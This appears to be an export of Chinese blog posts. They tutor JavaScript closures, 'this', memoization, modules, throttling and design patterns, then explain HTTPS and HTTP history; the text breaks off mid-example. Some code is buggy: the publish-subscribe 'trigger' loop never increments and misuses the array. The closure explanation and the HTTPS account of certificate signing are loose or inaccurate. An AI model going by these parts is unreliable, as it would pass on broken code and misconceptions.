在如下代码中有2个函数，f函数的功能是：把数组类型的参数中每个元素的值分别封装在闭包结构中，然后把闭包存储在一个数组中，并返回这个数组，但是在函数e中调用函数f并向其传递一个数组[&quot;a&quot;,&quot;b&quot;,&quot;c&quot;],然后遍历返回函数f返回数组，我们运行打印后发现都是c undefined，那是因为在执行f函数中的循环时候，把值虽然保存在temp中，但是每次循环后temp值在不断的变化，当for循环结束后，此时temp值为c，同时i变为3，因此当调用的时候 打印出来的是temp为3，arrs[3]变为undefined；因此打印出 c undefined 解决闭包的缺陷我们可以再在外面包一层函数，每次循环的时候，把temp参数和i参数传递进去 如代码二 1234567891011121314151617181920212223242526272829303132333435363738// 代码一function f(x) &#123; var arrs = []; for(var i = 0; i &lt; x.length; i++) &#123; var temp = x[i]; arrs.push(function()&#123; console.log(temp + ' ' +x[i]); // c undefined &#125;); &#125; return arrs;&#125;function e()&#123; var ar = f(["a","b","c"]); for(var i = 0,ilen = ar.length; i &lt; ilen; i++) &#123; ar[i](); &#125;&#125;e();// 代码二：function f2(x) &#123; var arrs = []; for(var i = 0; i &lt; x.length; i++) &#123; var temp = x[i]; (function(temp,i)&#123; arrs.push(function()&#123; console.log(temp + ' ' +x[i]); // c undefined &#125;); &#125;)(temp,i); &#125; return arrs;&#125;function e2()&#123; var ar = f2(["a","b","c"]); for(var i = 0,ilen = ar.length; i &lt; ilen; i++) &#123; ar[i](); &#125;&#125;e2(); 三：javascript中的this详解this的指向常见的有如下几点需要常用到： 全局对象的this是指向与window； 作为普通函数调用。 作为对象方法调用。 构造器调用。 Function.prototype.call 或 Function.prototype.apply调用。 下面我们分别来介绍一下： 1. 全局对象的this；123456789console.log(this); // this指向于windowsetTimeout() 和 setInterval()函数内部的this指针是指向于window的，如下代码： function test()&#123; console.log(11); &#125; setTimeout(function()&#123; console.log(this === window); // true this.test(); // 11 &#125;); 2. 作为普通函数调用；12345var name = "longen";function test()&#123; return this.name;&#125;console.log(test()); // longen 当作为普通函数调用时候，this总是指向了全局对象，在浏览器当中，全局对象一般指的是window； 3. 作为对象的方法调用。如下代码： 12345678var obj = &#123; "name": "我的花名改为云溪了，就是为了好玩", getName: function()&#123; console.log(this); // 在这里this指向于obj对象了 console.log(this.name); // 打印 我的花名改为云溪了，就是为了好玩 &#125;&#125;;obj.getName(); // 对象方法调用 但是呢，我们不能像如下一样调用对象了，如下调用对象的话，this还是执行了window，如下代码： 12345678910var name = "全局对象名字";var obj = &#123; "name": "我的花名改为云溪了，就是为了好玩", getName: function()&#123; console.log(this); // window console.log(this.name); // 全局对象名字 &#125;&#125;;var yunxi = obj.getName;yunxi(); 运行yunxi()函数，还是会像调用普通函数一样，this指向了window的； 4. 构造器调用。Javascript中不像Java一样，有类的概念，而JS中只能通过构造器创建对象，通过new 对象，当new运算符调用函数时候，该函数会返回一个对象，一般情况下，构造器里面的this就是指向返回的这个对象； 如下代码： 12345var Obj = function()&#123; this.name = "yunxi";&#125;;var test = new Obj();console.log(test.name); // yunxi 注意：构造器函数第一个字母需要大写，这是为了区分普通函数还是构造器函数而言； 如上代码：通过调用 new Obj()方法 返回值保存到test变量中，那么test就是那个对象了，所以内部的this就指向与test对象了，因此test.name就引用到了内部的this.name 即输出 “yunxi”字符串； 但是也有例外的情况，比如构造器显示地返回了一个对象的话，那么这次继续调用的话，那么会最终会返回这个对象，比如如下代码： 12345678var obj = function()&#123; this.name = "yunxi"; return &#123; "age": "27" &#125;&#125;;var test = new obj();console.log(test.name); // undefined 那么继续调用的话，会返回unedfined，因为返回的是那个对象，对象里面没有name这个属性，因此值为undefined； 四：理解函数引用和函数调用的区别看下面的代码分析: 12345678910111213141516171819202122232425262728// 函数引用 代码一function f()&#123; var x = 5; return x;&#125;var a = f;var b = f;console.log(a===b); // true// 函数调用 代码二function f2() &#123; var x = 5; return x;&#125;var a2 = f2();var b2 = f2();console.log(a2 === b2);// 函数调用 代码三function f3()&#123; var x = 5; return function()&#123; return x; &#125;&#125;var a3 = f3();var b3 = f3();console.log(a3 === b3); // false 如上的代码：代码一和代码二分部是函数引用和函数调用的列子，返回都为true，代码三也是函数调用的列子，返回且为false 我们现在来理解下函数引用和函数调用的本质区别：当引用函数时候，多个变量内存存储的是函数的相同的入口指针，因此对于同一个函数来讲，无论多少个变量引用，他们都是相等的，因为对于引用类型(对象，数组，函数等)都是比较的是内存地址，如果他们内存地址一样的话，说明是相同的；但是对于函数调用来讲，比如代码三;每次调用的时候，都被分配一个新的内存地址，所以他们的内存地址不相同，因此他们会返回false，但是对于代码二来讲，我们看到他们没有返回函数，只是返回数值，他们比较的不是内存地址，而是比较值，所以他们的值相等，因此他们也返回true，我们也可以看看如下实列化一个对象的列子，他们也被分配到不同的内存地址，因此他们也是返回false的；如下代码测试： 123456function F()&#123; this.x = 5;&#125;var a = new F();var b = new F();console.log(a === b); // false 五：理解js中的链式调用我们使用jquery的时候，jquery的简单的语法及可实现链式调用方法，现在我们自己也封装一个链式调用的方法，来理解下 jquery中如何封装链式调用 无非就是每次调用一个方法的时候 给这个方法返回this即可，this指向该对象自身，我们看看代码： 123456789101112131415161718192021222324252627282930313233// 定义一个简单的对象，每次调用对象的方法的时候，该方法都返回该对象自身var obj = &#123; a: function()&#123; console.log("输出a"); return this; &#125;, b:function()&#123; console.log("输出b"); return this; &#125;&#125;;console.log(obj.a().b()); // 输出a 输出b 输出this指向与obj这个对象// 下面我们再看下 上面的通过Function扩展类型添加方法的demo如下：Function.prototype.method = function(name,func) &#123; if(!this.prototype[name]) &#123; this.prototype[name] = func; return this; &#125;&#125;String.method('trim',function()&#123; return this.replace(/^\s+|\s+$/g,'');&#125;);String.method('log2',function()&#123; console.log("链式调用"); return this;&#125;);String.method('r',function()&#123; return this.replace(/a/,'');&#125;);var str = " abc ";console.log(str.trim().log2().r()); // 输出链式调用和 bc 六：理解使用函数实现历史记录–提高性能函数可以使用对象去记住先前操作的结果，从而避免多余的运算。比如我们现在测试一个费波纳茨的算法，我们可以使用递归函数计算fibonacci数列，一个fibonacci数字是之前两个fibonacci数字之和，最前面的两个数字是0和1；代码如下： 123456789var count = 0; var fibonacci = function(n) &#123; count++; return n &lt; 2 ? n : fibonacci(n-1) + fibonacci(n-2); &#125;; for(var i = 0; i &lt;= 10; i+=1) &#123; console.log(i+":"+fibonacci(i)); &#125; console.log(count); // 453 我们可以看到如上 fibonacci函数总共调用了453次，for循环了11次，它自身调用了442次，如果我们使用下面的记忆函数的话，那么就可以减少他们的运算次数，从而提高性能； 思路：先使用一个临时数组保存存储结果，当函数被调用的时候，先看是否已经有存储结果 如果有的话，就立即返回这个存储结果，否则的话，调用函数运算下；代码如下： 123456789101112131415161718var count2 = 0;var fibonacci2 = (function()&#123; var memo = [0,1]; var fib = function(n) &#123; var result = memo[n]; count2++; if(typeof result !== 'number') &#123; result = fib(n-1) + fib(n-2); memo[n] = result; &#125; return result; &#125;; return fib; &#125;)(); for(var j = 0; j &lt;= 10; j+=1) &#123; console.log(j+":"+fibonacci2(j)); &#125; console.log(count2); // 29 这个函数也返回了同样的结果，但是只调用了函数29次，循环了11次，也就是说函数自身调用了18次，从而减少无谓的函数的调用及运算，下面我们可以把这个函数进行抽象化，以构造带记忆功能的函数，如下代码： 123456789101112131415161718192021var count3 = 0;var memoizer = function(memo,formula) &#123; var recur = function(n) &#123; var result = memo[n]; count3++; // 这句代码只是说明运行函数多少次，在代码中并无作用，实际使用上可以删掉 if(typeof result !== 'number') &#123; result = formula(recur,n); memo[n] = result; &#125; return result; &#125;; return recur; &#125;; var fibonacci3 = memoizer([0,1],function(recur,n)&#123; return recur(n-1) + recur(n-2); &#125;); // 调用方式如下 for(var k = 0; k &lt;=10; k+=1) &#123; console.log(k+":"+fibonacci3(k)); &#125; console.log(count3); // 29 如上封装 memoizer 里面的参数是实现某个方法的计算公式，具体的可以根据需要自己手动更改，这边的思路无非就是想习惯使用对象去保存临时值，从而减少不必要的取值存储值的操作； 七：理解通过Function扩展类型javascript 允许为语言的基本数据类型定义方法。通过Object.prototype添加原型方法，该方法可被所有的对象使用。 这对函数，字符串，数字，正则和布尔值都适用，比如如下现在给Function.prototype增加方法，使该方法对所有函数都可用，代码如下： 123456789101112131415Function.prototype.method = function(name,func) &#123; if(!this.prototype[name]) &#123; this.prototype[name] = func; return this; &#125;&#125;Number.method('integer',function()&#123; return Math[this &lt; 0 ? 'ceil' : 'floor'](this);&#125;);console.log((-10/3).integer()); // -3String.method('trim',function()&#123; return this.replace(/^\s+|\s+$/g,'');&#125;);console.log(" abc ".trim()); // abc 八：理解使用模块模式编写代码使用函数和闭包可以构建模块，所谓模块，就是一个提供接口却隐藏状态与实现的函数或对象。使用函数构建模块的优点是：减少全局变量的使用； 比如如下：我想为String扩展一个方法，该方法的作用是寻找字符串中的HTML字符字体并将其替换为对应的字符； 123456789101112131415161718192021// 如下代码：Function.prototype.method = function(name,func) &#123; if(!this.prototype[name]) &#123; this.prototype[name] = func; return this; &#125;&#125;String.method('deentityify',function()&#123; var entity = &#123; quot: '"', It: '&lt;', gt: '&gt;' &#125;; return function()&#123; return this.replace(/&amp;([^&amp;;]+);/g,function(a,b)&#123; var r = entity[b]; return typeof r === 'string' ? r : a; &#125;); &#125;&#125;());console.log("&amp;It;&amp;quot;&amp;gt;".deentityify()); // &lt;"&gt; 模块模式利用函数作用域和闭包来创建绑定对象与私有成员的关联，比如在上面的deentityify()方法才有权访问字符实体表entity这个数据对象； 模块开发的一般形式是：定义了私有变量和函数的函数，利用闭包创建可以访问到的私有变量和函数的特权函数，最后返回这个特权函数，或把他们保存到可以访问的地方。 模块模式一般会结合实例模式使用。javascript的实例就是使用对象字面量表示法创建的。对象的属性值可以是数值或者函数，并且属性值在该对象的生命周期中不会发生变化；比如如下代码属于模块模式：定义了一个私有变量name属性，和一个实例模式(对象字面量obj)并且返回这个对象字面量obj，对象字面量中的方法与私有变量name进行了绑定； 123456789101112131415// 比如如下经典的模块模式var MODULE = (function()&#123; var name = "tugenhua"; var obj = &#123; setName: function() &#123; this.name = name; &#125;, getName: function()&#123; return this.name; &#125; &#125;; return obj;&#125;)();MODULE.setName()console.log(MODULE.getName()); // tugenhua 九：理解惰性实列化在页面中javascript初始化执行的时候就实例化类，如果在页面中没有使用这个实列化的对象，就会造成一定的内存浪费和性能损耗；这时候，我们可以使用惰性实列化来解决这个问题，惰性就是把实列化推迟到需要使用它的时候才去做，做到 “按需供应”; 12345678910111213141516171819202122232425262728293031323334353637383940414243// 惰性实列化代码如下var myNamespace = function()&#123; var Configure = function()&#123; var privateName = "tugenhua"; var privateGetName = function()&#123; return privateName; &#125;; var privateSetName = function(name) &#123; privateName = name; &#125;; // 返回单列对象 return &#123; setName: function(name) &#123; privateSetName(name); &#125;, getName: function()&#123; return privateGetName(); &#125; &#125; &#125;; // 存储Configure实列 var instance; return &#123; init: function()&#123; // 如果不存在实列，就创建单列实列 if(!instance) &#123; instance = Configure(); &#125; // 创建Configure单列 for(var key in instance) &#123; if(instance.hasOwnProperty(key)) &#123; this[key] = instance[key]; &#125; &#125; this.init = null; return this; &#125; &#125;&#125;();// 调用方式myNamespace.init();var name = myNamespace.getName();console.log(name); // tugenhua 如上代码是惰性化实列代码：它包括一个单体Configure实列，直接返回init函数，先判断该单体是否被实列化，如果没有被实列化的话，则创建并执行实列化并返回该实列化，如果已经实列化了，则返回现有实列；执行完后，则销毁init方法，只初始化一次 十：惰性载入函数（也是解决兼容问题的）和上面分支的原理是一样的，代码也可以按照上面的推荐分支风格编码的；解决的问题也是解决多个if条件判断的；代码如下： 123456789// 代码如下：var addEvent = function(el,type,handler)&#123; addEvent = el.addEventListener ? function(el,type,handler)&#123; el.addEventListener(type,handler,false); &#125; : function(el,type,handler) &#123; el.attachEvent("on" + type,handler); &#125; addEvent(el,type,handler);&#125;; 惰性载入函数也是在函数内部改变自身的一种方式，在重复执行的时候就不会再进行检测的；惰性载入函数的分支只会执行一次，即第一次调用的时候，其优点如下： 要执行的适当代码只有在实际调用函数时才执行。 第一次调用该函数的时候，紧接着内部函数也会执行，但是正因为这个，所以后续继续调用该函数的话，后续的调用速度会很快；因此避免了多重条件； 十一：理解函数节流DOM操作的交互需要更多的内存和CPU时间，连续进行过多的DOM相关的操作可能会导致浏览器变慢甚至崩溃，函数节流的设计思想是让某些代码可以在间断的情况下连续重复执行，实现该方法可以使用定时器对该函数进行节流操作; 比如：第一次调用函数的时候，创建一个定时器，在指定的时间间隔下执行代码。当第二次执行的时候，清除前一次的定时器并设置另一个，将其替换成一个新的定时器; 1234567891011// 如下简单函数节流代码演示function throttle(method, context) &#123; clearTimeout(method.tId); method.tId = setTimeout(function () &#123; method.call(context); &#125;,500);&#125;// 执行操作window.onresize = function () &#123; throttle(handle, window);&#125; 函数节流解决的问题是一些代码(比如事件)无间断的执行，这可能会影响浏览器的性能，比如浏览器变慢或者直接崩溃。比如对于mouseover事件或者click事件，比如点击tab项菜单，无限的点击，有可能会导致浏览器会变慢操作，这时候我们可以使用函数节流的操作来解决；]]></content>
      <categories>
        <category>综合</category>
      </categories>
      <tags>
        <tag>基础知识</tag>
        <tag>函数式编程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[综合-设计模式]]></title>
    <url>%2F2018%2F04%2F17%2F%E7%BB%BC%E5%90%88_%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[设计模式工厂模式介绍与创建型模式类似，工厂模式创建对象（视为工厂里的产品）时无需指定创建对象的具体类。 工厂模式定义一个用于创建对象的接口，这个接口由子类决定实例化哪一个类。该模式使一个类的实例化延迟到了子类。而子类可以重写接口方法以便创建的时候指定自己的对象类型。 这个模式十分有用，尤其是创建对象的流程赋值的时候，比如依赖于很多设置文件等。并且，你会经常在程序里看到工厂方法，用于让子类定义需要创建的对象类型。 123456789101112131415var CarFactory = (function () &#123; var carManager = &#123;&#125;; carManager.Car = function () &#123; this.type = 'car' &#125; carManager.Truck = function () &#123; this.type = 'truck'; &#125; return function (type) &#123; return new carManager[type](); &#125;&#125;)();var car = CarFactory('Car');var truck = CarFactory('Truck'); 工厂模式使用场景 对象的构建十分复杂 需要依赖具体环境创建不同实例 处理大量具有相同属性的小对象 单体模式介绍在传统开发工程师眼里，单例就是保证一个类只有一个实例，实现的方法一般是先判断实例存在与否，如果存在直接返回，如果不存在就创建了再返回，这就确保了一个类只有一个实例对象。在JavaScript里，单例作为一个命名空间提供者，从全局命名空间里提供一个唯一的访问点来访问该对象。 12345678910111213function Universe() &#123; if (typeof Universe.instance === 'object') &#123; return Universe.instance; &#125; this.start_time = 0; this.bang = 'Big'; Universe.instance = this;&#125;var u1 = new Universe();var u2 = new Universe();console.log(u1 === u2); // true 发布订阅模式介绍发布—订阅模式又叫观察者模式，它定义了对象间的一种一对多的关系，让多个观察者对象同时监听某一个主题对象，当一个对象发生改变时，所有依赖于它的对象都将得到通知。 1234567891011121314151617181920212223242526272829303132333435var Event = &#123; list: &#123;&#125;, listen: function (key, callBack) &#123; if (!this.list[key]) &#123; this.list[key] = []; &#125; this.list[key].push(callBack); &#125;, trigger: function () &#123; var key = arguments[0]; var fns = this.list[key]; if (!fns || fns.length === 0) &#123; return; &#125; for (var i = 0; i &lt; fns.length) &#123; fns.call(this, arguments); &#125; &#125;, remove: function (key, fn) &#123; var fns = this.list[key]; if (!fns) &#123; return; &#125; if (!fn) &#123; fns = []; &#125; else &#123; for (var i = fns.length - 1; i &gt;=0; i--) &#123; var _fn = fns[i]; if (_fn === fn) &#123; fns.splice(i, 1); &#125; &#125; &#125; &#125;&#125;]]></content>
      <categories>
        <category>综合</category>
      </categories>
      <tags>
        <tag>基础知识</tag>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[综合-HTTPS原理入门]]></title>
    <url>%2F2018%2F04%2F17%2F%E7%BB%BC%E5%90%88_HTTPS%E5%8E%9F%E7%90%86%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[https 原理入门一、WHY我们先不了聊HTTP，HTTPS，我们先从一个聊天软件说起，我们要实现A能发一个hello消息给B： 如果我们要实现这个聊天软件，本文只考虑安全性问题，要实现 A发给B的hello消息包，即使被中间人拦截到了，也无法得知消息的内容 二、HOW如何做到真正的安全？这个问题，很多人马上就想到了各种加密算法，什么对称加密、非对称加密、DES、RSA、XX、噼里啪啦~ 而我想说，加密算法只是解决方案，我们首先要做的是理解我们的问题——什么是安全？ 我个人的理解是： A与B通信的内容，有且只有A和B有能力看到通信的真正内容，好！问题已经定义好了（现实中当然不止这一种定义）。对于解决方案，很容易就想到了对消息进行加密。 题外话，但是只有这一种方法吗？我看未必，说不定在将来会出现一种物质打破当前世界的通信假设，实现真正意义上的保密。 对于A与B这样的简单通信模型，我们很容易做出选择： 这就是对称加密算法，其中图中的密钥S同时扮演加密和解密的角色。具体细节不是本文范畴。 只要这个密钥S不公开给第三者，同时密钥S足够安全，我们就解决了我们一开始所定问题域了。因为世界上有且只有A与B知道如何加密和解密他们之间的消息。 但是，在WWW环境下，我们的Web服务器的通信模型没有这么简单： 如果服务器端对所有的客户端通信都使用同样的对称加密算法，无异于没有加密。那怎么办呢？即能使用对称加密算法，又不公开密钥？请读者思考21秒钟。😜 答案是：Web服务器与每个客户端使用不同的对称加密算法： 如何确定对称加密算法慢着，另一个问题来了，我们的服务器端怎么告诉客户端该使用哪种对称加密算法？ 当然是通过协商。 但是，你协商的过程是没有加密的，还是会被中间人拦截。那我们再对这个协商过程进行对称加密就好了，那你对协商过程加密的加密还是没有加密，怎么办？再加密不就好了……好吧，进行鸡生蛋蛋生鸡的问题了。 如何对协商过程进行加密新问题来了，如何对协商过程进行加密？密码学领域中，有一种称为“非对称加密”的加密算法，特点是私钥加密后的密文，只要是公钥，都可以解密，但是公钥加密后的密文，只有私钥可以解密。私钥只有一个人有，而公钥可以发给所有的人。 虽然服务器端向A、B……的方向还是不安全的，但是至少A、B向服务器端方向是安全的。 好了，如何协商加密算法的问题，我们解决了：使用非对称加密算法进行对称加密算法协商过程。 这下，你明白为什么HTTPS同时需要对称加密算法和非对称加密算法了吧？ 协商什么加密算法要达到Web服务器针对每个客户端使用不同的对称加密算法，同时，我们也不能让第三者知道这个对称加密算法是什么，怎么办？ 使用随机数，就是使用随机数来生成对称加密算法。这样就可以做到服务器和客户端每次交互都是新的加密算法、只有在交互的那一该才确定加密算法。 这下，你明白为什么HTTPS协议握手阶段会有这么多的随机数了吧。 如何得到公钥？细心的人可能已经注意到了如果使用非对称加密算法，我们的客户端A，B需要一开始就持有公钥，要不没法开展加密行为啊。 这下，我们又遇到新问题了，如何让A、B客户端安全地得到公钥？ 我能想到的方案只有这些： 方案1. 服务器端将公钥发送给每一个客户端 方案2. 服务器端将公钥放到一个远程服务器，客户端可以请求得到 我们选择方案1，因为方案2又多了一次请求，还要另外处理公钥的放置问题。 公钥被调包了怎么办？又是一个鸡生蛋蛋生鸡问题？但是方案1有个问题：如果服务器端发送公钥给客户端时，被中间人调包了，怎么办？ 我画了张图方便理解： 显然，让每个客户端的每个浏览器默认保存所有网站的公钥是不现实的。 使用第三方机构的公钥解决鸡生蛋蛋生鸡问题公钥被调包的问题出现，是因为我们的客户端无法分辨返回公钥的人到底是中间人，还是真的服务器。这其实就是密码学中提的身份验证问题。 如果让你来解决，你怎么解决？如果你了解过HTTPS，会知道使用数字证书来解决。但是你想过证书的本质是什么么？请放下你对HTTPS已有的知识，自己尝试找到解决方案。 我是这样解决的。既然服务器需要将公钥传给客户端，这个过程本身是不安全，那么我们为什么不对这个过程本身再加密一次？可是，你是使用对称加密，还是非对称加密？这下好了，我感觉又进了鸡生蛋蛋生鸡问题了。 问题的难点是如果我们选择直接将公钥传递给客户端的方案，我们始终无法解决公钥传递被中间人调包的问题。 所以，我们不能直接将服务器的公钥传递给客户端，而是第三方机构使用它的私钥对我们的公钥进行加密后，再传给客户端。客户端再使用第三方机构的公钥进行解密。 下图就是我们设计的第一版“数字证书”，证书中只有服务器交给第三方机构的公钥，而且这个公钥被第三方机构的私钥加密了： 如果能解密，就说明这个公钥没有被中间人调包。因为如果中间人使用自己的私钥加密后的东西传给客户端，客户端是无法使用第三方的公钥进行解密的。 话到此，我以为解决问题了。但是现实中HTTPS，还有一个数字签名的概念，我没法理解它的设计理由。 原来，我漏掉了一个场景：第三方机构不可能只给你一家公司制作证书，它也可能会给中间人这样有坏心思的公司发放证书。这样的，中间人就有机会对你的证书进行调包，客户端在这种情况下是无法分辨出是接收的是你的证书，还是中间人的。因为不论中间人，还是你的证书，都能使用第三方机构的公钥进行解密。像下面这样： 第三方机构向多家公司颁发证书的情况： 客户端能解密同一家第三机构颁发的所有证书： 最终导致其它持有同一家第三方机构证书的中间人可以进行调包： 数字签名，解决同一机构颁发的不同证书被篡改问题要解决这个问题，我们首先要想清楚一个问题，辨别同一机构下不同证书的这个职责，我们应该放在哪？ 只能放到客户端了。意思是，客户端在拿到证书后，自己就有能力分辨证书是否被篡改了。如何才能有这个能力呢？ 我们从现实中找灵感。比如你是HR，你手上拿到候选人的学历证书，证书上写了持证人，颁发机构，颁发时间等等，同时证书上，还写有一个最重要的：证书编号！我们怎么鉴别这张证书是的真伪呢？只要拿着这个证书编号上相关机构去查，如果证书上的持证人与现实的这个候选人一致，同时证书编号也能对应上，那么就说明这个证书是真实的。 我们的客户端能不能采用这个机制呢？像这样： 可是，这个“第三方机构”到底是在哪呢？是一个远端服务？不可能吧？如果是个远端服务，整个交互都会慢了。所以，这个第三方机构的验证功能只能放在客户端的本地了。 客户端本地怎么验证证书呢？下边的说明并不完全准确，总之，客户端有验证证书是否合法的能力 客户端本地怎么验证证书呢？答案是证书本身就已经告诉客户端怎么验证证书的真伪。 也就是证书上写着如何根据证书的内容生成证书编号。客户端拿到证书后根据证书上的方法自己生成一个证书编号，如果生成的证书编号与证书上的证书编号相同，那么说明这个证书是真实的。 同时，为避免证书编号本身又被调包，所以使用第三方的私钥进行加密。 这地方有些抽象，我们来个图帮助理解： 证书的制作如图所示。证书中的“编号生成方法MD5”就是告诉客户端：你使用MD5对证书的内容求值就可以得到一个证书编号。 当客户端拿到证书后，开始对证书中的内容进行验证，如果客户端计算出来的证书编号与证书中的证书编号相同，则验证通过： 但是第三方机构的公钥怎么跑到了客户端的机器中呢？世界上这么多机器。 其实呢，现实中，浏览器和操作系统都会维护一个权威的第三方机构列表（包括它们的公钥）。因为客户端接收到的证书中会写有颁发机构，客户端就根据这个颁发机构的值在本地找相应的公钥。 题外话：如果浏览器和操作系统这道防线被破了，就没办法。想想当年自己装过的非常规XP系统，都害怕。说到这里，想必大家已经知道上文所说的，证书就是HTTPS中数字证书，证书编号就是数字签名，而第三方机构就是指数字证书签发机构（CA）。 CA如何颁发数字证书给服务器端的？当我听到这个问题时，我误以为，我们的SERVER需要发网络请求到CA部门的服务器来拿这个证书。😭 到底是我理解能力问题，还是。。 其实，问题应该是CA如何颁发给我们的网站管理员，而我们的管理员又如何将这个数字证书放到我们的服务器上。 我们如何向CA申请呢？每个CA机构都大同小异，我在网上找了一个： 拿到证书后，我们就可以将证书配置到自己的服务器上了。那么如何配置？这是具体细节了，留给大家google了。 也许我们需要整理一下思路我们通过推算的方式尝试还原HTTPS的设计过程。这样，我们也就明白了为什么HTTPS比HTTP多那么多次的交互，为什么HTTPS的性能会差，以及找到HTTPS的性能优化点。 而上面一大堆工作都是为了让客户端与服务器端安全地协商出一个对称加密算法。这就是HTTPS中的SSL/TLS协议主要干的活。剩下的就是通信时双方使用这个对称加密算法进行加密解密。 以下是一张HTTPS协议的真实交互图（从网上copy的，忘了从哪了，如果侵权麻烦告知）： 能不能用一句话总结HTTPS？答案是不能，因为HTTPS本身实在太复杂。但是我还是尝试使用一段话来总结HTTPS: HTTPS要使客户端与服务器端的通信过程得到安全保证，必须使用的对称加密算法，但是协商对称加密算法的过程，需要使用非对称加密算法来保证安全，然而直接使用非对称加密的过程本身也不安全，会有中间人篡改公钥的可能性，所以客户端与服务器不直接使用公钥，而是使用数字证书签发机构颁发的证书来保证非对称加密过程本身的安全。这样通过这些机制协商出一个对称加密算法，就此双方使用该算法进行加密解密。从而解决了客户端与服务器端之间的通信安全问题。 三、WHATHTTPS的缺点 SEO方面：据ACM CoNEXT数据显示，使用HTTPS协议会使页面的加载时间延长近50%，增加10%到20%的耗电，此外，HTTPS协议还会影响缓存，增加数据开销和功耗，甚至已有安全措施也会受到影响也会因此而受到影响。 经济方面：SSL证书需要钱，功能越强大的证书费用越高，个人网站、小网站没有必要一般不会用;HTTPS连接缓存不如HTTP高效，大流量网站如非必要也不会采用，流量成本太高; HTTPS连接服务器端资源占用高很多，支持访客稍多的网站需要投入更大的成本，如果全部采用HTTPS，基于大部分计算资源闲置的假设的VPS的平均成本会上去; HTTPS协议握手阶段比较费时，对网站的相应速度有负面影响，如非必要，没有理由牺牲用户体验。 中间人攻击在密码学和计算机安全领域中，中间人攻击（英语：Man-in-the-middle attack，缩写：MITM）是指攻击者与通讯的两端分别创建独立的联系，并交换其所收到的数据，使通讯的两端认为他们正在通过一个私密的连接与对方直接对话，但事实上整个会话都被攻击者完全控制。在中间人攻击中，攻击者可以拦截通讯双方的通话并插入新的内容。在许多情况下这是很简单的（例如，在一个未加密的Wi-Fi 无线接入点的接受范围内的中间人攻击者，可以将自己作为一个中间人插入这个网络）。 一个中间人攻击能成功的前提条件是攻击者能将自己伪装成每一个参与会话的终端，并且不被其他终端识破。中间人攻击是一个（缺乏）相互认证的攻击。大多数的加密协议都专门加入了一些特殊的认证方法以阻止中间人攻击。例如，SSL协议可以验证参与通讯的一方或双方使用的证书是否是由权威的受信任的数字证书认证机构颁发，并且能执行双向身份认证。]]></content>
      <categories>
        <category>综合</category>
      </categories>
      <tags>
        <tag>基础知识</tag>
        <tag>https</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[综合-HTTP协议入门]]></title>
    <url>%2F2018%2F04%2F17%2F%E7%BB%BC%E5%90%88_HTTP%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[HTTP 协议入门HTTP 协议是互联网的基础协议，也是网页开发的必备知识，最新版本 HTTP/2 更是让它成为技术热点。本文介绍 HTTP 协议的历史演变和设计思路。 HTTP协议是Hyper Text Transfer Protocol（超文本传输协议）的缩写,是用于从万维网（WWW:World Wide Web ）服务器传输超文本到本地浏览器的传送协议。 HTTP是一个基于TCP/IP通信协议来传递数据（HTML 文件, 图片文件, 查询结果等）。 一、HTTP/0.9HTTP 是基于TCP/IP协议的应用层协议。它不涉及数据包（packet）传输，主要规定了客户端和服务器之间的通信格式，默认使用80端口。 最早版本是1991年发布的0.9版。该版本极其简单，只有一个命令GET。 1GET /index.html 上面命令表示，TCP 连接（connection）建立后，客户端向服务器请求（request）网页index.html。协议规定，服务器只能回应HTML格式的字符串，不能回应别的格式。 123&lt;html&gt; &lt;body&gt;Hello World&lt;/body&gt;&lt;/html&gt; 服务器发送完毕，就关闭TCP连接。 二、HTTP/1.02.1 简介1996年5月，HTTP/1.0 版本发布，内容大大增加。 首先，任何格式的内容都可以发送。这使得互联网不仅可以传输文字，还能传输图像、视频、二进制文件。这为互联网的大发展奠定了基础。 其次，除了GET命令，还引入了POST命令和HEAD命令，丰富了浏览器与服务器的互动手段。 再次，HTTP请求和回应的格式也变了。除了数据部分，每次通信都必须包括头信息（HTTP header），用来描述一些元数据。 其他的新增功能还包括状态码（status code）、多字符集支持、多部分发送（multi-part type）、权限（authorization）、缓存（cache）、内容编码（content encoding）等。 2.2 请求以及相应格式这个将在HTTP/1.1部分讲解 2.3 缺点HTTP/1.0 版的主要缺点是，每个TCP连接只能发送一个请求。发送数据完毕，连接就关闭，如果还要请求其他资源，就必须再新建一个连接。 TCP连接的新建成本很高，因为需要客户端和服务器三次握手，并且开始时发送速率较慢（slow start）。所以，HTTP 1.0版本的性能比较差。随着网页加载的外部资源越来越多，这个问题就愈发突出了。 为了解决这个问题，有些浏览器在请求时，用了一个非标准的Connection字段。 1Connection: keep-alive 这个字段要求服务器不要关闭TCP连接，以便其他请求复用。服务器同样回应这个字段。 1Connection: keep-alive 一个可以复用的TCP连接就建立了，直到客户端或服务器主动关闭连接。但是，这不是标准字段，不同实现的行为可能不一致，因此不是根本的解决办法。 三、HTTP/1.11997年1月，HTTP/1.1 版本发布，只比 1.0 版本晚了半年。它进一步完善了 HTTP 协议，一直用到了20年后的今天，直到现在还是最流行的版本。 3.1 请求格式GET的例子123456789GET /562f25980001b1b106000338.jpg HTTP/1.0Host: img.mukewang.comUser-Agent: Mozilla/5.0 (Macintosh; Intel …) Gecko/20100101 Firefox/55.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://fragment.firefoxchina.c…/baidu_main_page_250x250.htmlCookie: BAIDUID=F395366A0E9261C1F376BA…BAE2E839289B; PSTM=1494254264Connection: keep-alive POST的例子 12345678POST / HTTP1.1Host:www.wrox.comUser-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)Content-Type:application/x-www-form-urlencodedContent-Length:40Connection: Keep-Alivename=Professional%20Ajax&amp;publisher=Wiley 第一部分是请求命令，必须在尾部添加协议版本（HTTP/1.1）。第二部分后面就是多行头信息，描述客户端的情况。第三部分：空行，即使第四部分没有请求的数据体，空行也要有。第四部分：请求数据。 3.2 回应格式服务器的回应如下。12345678910HTTP/1.1 200 OKContent-Type: text/plainContent-Length: 137582Expires: Thu, 05 Dec 1997 16:00:00 GMTLast-Modified: Wed, 5 August 1996 